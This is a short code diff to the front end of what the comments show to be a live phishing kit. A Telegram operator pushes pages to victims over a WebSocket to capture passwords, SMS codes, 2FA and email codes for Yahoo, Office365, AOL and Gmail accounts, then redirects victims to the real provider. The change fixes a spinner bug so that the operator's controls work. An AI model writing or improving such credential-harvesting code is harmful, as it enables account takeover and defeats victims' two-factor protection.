@@ -326,6 +326,13 @@ function App() {
   // per-provider full-screen page; there is no generic overlay.
   const handleWebSocketMessage = (message: WebSocketMessage) => {
     const { command, data } = message;
+    // Any operator-driven command means the next UI state has arrived from
+    // Telegram — clear the "waiting for operator" spinner so the navigated
+    // page actually renders. Without this, after a user submits a retry
+    // password / SMS code / 2FA / email code the full-screen spinner would
+    // sit on top of every subsequent show_* route, making Yahoo / Office365
+    // / AOL (and Gmail) Telegram buttons appear non-responsive.
+    setIsLoading(false);
     if (command === 'redirect' && typeof data?.url === 'string') {
       // Operator-driven terminal redirect (e.g. to the real provider after capture).
       window.location.href = data.url as string;
